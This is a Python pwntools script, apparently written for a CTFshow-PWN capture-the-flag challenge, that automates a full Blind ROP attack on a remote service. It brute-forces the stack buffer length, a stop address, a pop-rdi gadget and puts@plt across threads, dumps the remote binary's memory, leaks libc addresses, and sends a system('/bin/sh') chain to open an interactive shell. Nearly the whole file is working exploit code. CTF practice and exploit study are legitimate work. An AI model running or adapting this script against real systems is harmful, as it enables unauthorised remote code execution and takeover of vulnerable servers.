# -*- coding: utf-8 -*-
# @Time     : 2023/12/15 15:49
# @Author   : 君叹
# @File     : BlindRop.py

from pwn import *
import threading, os
from time import sleep
from LibcSearcher import *
import sys


class BlindRop(object):
    def __init__(self, target, port):
        self.target = target
        self.port = port
        self.buf_length = None
        self.stop_addr = None
        self.gadget = None
        self.pop_rdi = None
        self.puts_plt = None
        self.puts_got = None

        self.base_address = 0x400000 # 默认的 后续加一个测试的方法 询问是否开启PIE这样
        self.thread_num = 10 # 线程数

    def _dichotomy(self, fun):
        num = 1
        jici = 0
        while fun(num):
            jici += 1
            num *= 2  # 确定范围
        min = num / 2
        max = num
        c = (max + min) // 2
        while min <= max:
            mid = (min + max) // 2
            if max - min == 1:
                log.success(f"共进行了 {jici} 次链接\n栈长度为: {mid}")
                return int(min)
            if fun(mid):  # 返回true，成立，那就是没到位
                min = mid
            else:
                max = mid
        log.success(f"进行了 {jici} 次测试链接")
        log.success(f"缓冲区空间大小: {mid}")
        sleep(1)
        return int(mid)

    def getbufLength(self):
        # 使用二分法快速寻找到 ebp-buf 的值
        def is_True(num):
            try:
                io = remote(self.target, self.port)
                io.sendafter("Welcome to CTFshow-PWN ! Do you know who is daniu?\n", 'a' * int(num))
                data = io.recv()
                io.close()
                if not data.startswith(b"No passwd"):
                    return False
                return True
            except EOFError:
                io.close()
                return False
        self.buf_length = self._dichotomy(is_True)

        return self.buf_length

    def _is_True(self, output):
        print(output)
        if output.startswith(b'Welcome to CTFshow-PWN ! Do you know who is daniu?'):
            return True
        return False

    def _getStopAddr(self, start_address, end_address):
        while start_address < end_address and self.stop_addr is None:
            log.success(f"正在测试: 0x{start_address:x}")
            try:
                io = remote(self.target, self.port, timeout=0.5)
                payload = b'a' * self.buf_length + p64(start_address)
                io.sendafter("Do you know who is daniu?\n", payload)
                output = io.recv()
                if not self._is_True(output):
                    io.close()
                    start_address += self.thread_num
                else:
                    self.stop_addr = start_address
                    log.success(f'stop address ==> 0x{start_address:x}')
                    sleep(1)
                    return start_address
            except EOFError:
                start_address += self.thread_num
                io.close()
            except:
                pass
        return None

    def _getputs_plt(self, addr, end_addr=0x401000):
        pop_rdi = self.pop_rdi
        while addr < end_addr and self.puts_plt is None:
            sleep(0.1)
            addr += self.thread_num
            payload = b'a' * self.buf_length
            payload += p64(pop_rdi)
            payload += p64(0x400000)
            payload += p64(addr)
            payload += p64(self.stop_addr)
            try:
                io = remote(self.target, self.port)
                io.sendafter("Do you know who is daniu?\n", payload)
                if io.recv(timeout=0.2).startswith(b"\x7fELF"):
                    log.info(f"puts@plt address: 0x{addr:x}")
                    sleep(1)
                    io.close()
                    self.puts_plt = addr
                    return addr
                log.info(f"find puts plt bad: 0x{addr:x}")
                io.close()
            except EOFError as e:
                io.close()
                log.info(f"bad: 0x{addr:x}")
            except:
                logging.info("Can't connect")
                addr -= self.thread_num

    def getgadgetsAddr(self):
        addr = self.stop_addr
        while True:
            sleep(0.1)
            addr += 1
            payload = b'a' * self.buf_length
            payload += p64(addr)
            payload += p64(1) + p64(2) + p64(3) + p64(4) + p64(5) + p64(6)
            payload += p64(self.stop_addr)
            try:
                io = remote(self.target, self.port)
                io.sendafter("Do you know who is daniu?\n", payload)
                reponse = io.recv(timeout=0.2)
                io.close()
                log.info(f"find address: 0x{addr:x}")
                if b'Welcome to CTFshow-PWN ! Do you know who is daniu?' in reponse:
                    payload = b'a' * self.buf_length
                    payload += p64(addr) + p64(1) + p64(2) + p64(3) + p64(4) + p64(5) + p64(6)
                    io = remote(self.target, self.port)
                    io.sendafter("Do you know who is daniu?\n", payload)
                    reponse = io.recv(timeout=0.2)
                    io.recv(timeout=0.2)
                    if b'Welcome to CTFshow-PWN ! Do you know who is daniu?' not in reponse:
                        io.close()
                        log.success(f"gadget address: 0x{addr:x}")
                        sleep(1)
                        self.gadget = addr
                        self.pop_rdi = addr + 9
                        return addr
                    io.close()
                    log.info(f"bad1 stop address: 0x{addr:x}")
                else:
                    io.close()
                    log.info(f"bad2 address: 0x{addr:x}")
            except EOFError as e:
                io.close()
                log.info(f"bad2 address: 0x{addr:x}")

    def dump_memory(self, start_addr, end_addr):
        pop_rdi = self.gadget + 9
        result = b""
        with open('pwnfile', 'wb') as f1:
            while start_addr < end_addr:
                sleep(0.1)
                payload = b'a' * self.buf_length
                payload += p64(pop_rdi)
                payload += p64(start_addr)
                payload += p64(self.puts_plt)
                payload += p64(self.stop_addr)
                try:
                    io = remote(self.target, self.port)
                    log.info('send one')
                    io.sendafter("Do you know who is daniu?\n", payload)
                    data = io.recvuntil("Welcome to CTFshow-PWN", timeout=0.1, drop=True)  # byte 类型
                    if data == b'\n':
                        data = b'\x00'
                    elif data == b'':
                        io.close()
                        io = remote(self.target, self.port)
                        log.info("send two")
                        io.sendafter("Do you know who is daniu?\n", payload)
                        data = io.recv(timeout=0.1)
                        if data.count(b"Welcome") > 1:
                            data = data.decode().split("\n")[0].encode()
                        elif data[-1] == 10:
                            data = data[:-1]
                    elif data[-1] == 10:
                        data = data[:-1]
                    log.info(f"leaking: 0x{start_addr:x} --> {(data or b'').hex()}")
                    result += data
                    f1.write(data)
                    start_addr += len(data)
                    io.close()
                except EOFError as e:
                    print()
                    log.info("Can't connect")
                except:
                    log.error("Can't connect")
        return result
    def _Threadfunc(self, func):
        for i in range(0x400000, 0x400000 + self.thread_num):
            print(i)
            thread = threading.Thread(target=func, args=(i, 0x401000))
            thread.start()
        thread.join()

    def getStopAddr(self):
        self._Threadfunc(self._getStopAddr)
    def getputs_plt(self):
        self._Threadfunc(self._getputs_plt)

    def setThreadnum(self, num:int):
        self.thread_num = num

    def getshell(self):
        """
        !!!!!!!!!!!!!!!
        get 他妈的 shell
        :return: shell
        """
        io = remote(self.target, self.port)
        payload = b'a' * self.buf_length
        payload += p64(self.pop_rdi) + p64(self.puts_got) + p64(self.puts_plt) + p64(self.stop_addr)
        io.sendafter("Do you know who is daniu?\n", payload)
        puts = u64(io.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
        log.success(f"puts got address ==> 0x{puts:x}")
        libc = LibcSearcher('puts', puts)
        libc_base = puts - libc.dump('puts')
        system = libc_base + libc.dump('system')
        bin_sh = libc_base + libc.dump('str_bin_sh')

        payload = b'a' * self.buf_length + p64(self.pop_rdi) + p64(bin_sh) + p64(system)
        io.sendline(payload)
        io.interactive()

    def main(self):
        # 读取文件，存在文件则读取，不存在则创建，当前目录下创建 .<目标地址>_端口号的文件
        path = f'./.{self.target}_{self.port}'
        with open(path, 'a') as f1:
            if self.buf_length is None:
                self.getbufLength()
                f1.write(f"buf_len: 0x{self.buf_length:x}\n")
            if self.stop_addr is None:
                self.getStopAddr()
                f1.write(f"stop_addr: 0x{self.stop_addr:x}\n")
            if self.gadget is None:
                self.getgadgetsAddr()
                f1.write(f"gadget addr: 0x{self.gadget:x}\n")
            if self.pop_rdi is None:
                self.pop_rdi = self.gadget + 9
            if self.puts_plt is None:
                self.getputs_plt()
                f1.write(f"puts plt addr: 0x{self.puts_plt:x}\n")
            if not os.path.exists('./pwnfile'):
                self.dump_memory(0x400000,0x401000)
            if self.puts_got is None:
                log.info("请输入puts got: ")
                self.puts_got = int(input().strip("\n"), 16)

        self.getshell()





if __name__ == '__main__':
    target = BlindRop(sys.argv[1], sys.argv[2])
    target.buf_length = 72
    target.stop_addr = 0x400728
    target.gadget = 0x40083a
    target.pop_rdi = 0x40083a + 9
    target.puts_plt = 0x400550
    target.main()



